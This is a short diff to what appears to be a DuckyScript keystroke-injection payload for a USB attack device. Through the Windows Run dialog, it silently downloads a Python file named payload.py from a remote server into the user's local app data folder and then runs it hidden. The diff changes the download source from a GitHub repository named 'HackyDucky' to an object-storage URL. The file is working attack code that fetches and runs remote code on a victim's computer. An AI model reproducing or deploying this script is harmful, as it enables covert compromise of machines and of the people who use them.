@@ -36,10 +36,12 @@ DELAY 30000
 REM Download main payload
 GUI r
 DELAY 100
-STRING start /b curl -output-dir %localappdata%\python1 -o python-manager.py "https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py"
+STRING start /b curl -output-dir %localappdata%\python1 -o python-manager.py "https://hc-cdn.hel1.your-objectstorage.com/s/v3/fdb57365c00e7a5cc6521098d8e732e3075f01f6_payload.py"
 DELAY 3000
 
 REM Run main payload
 GUI r
 DELAY 100
 STRING start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py
+
+REM Done!
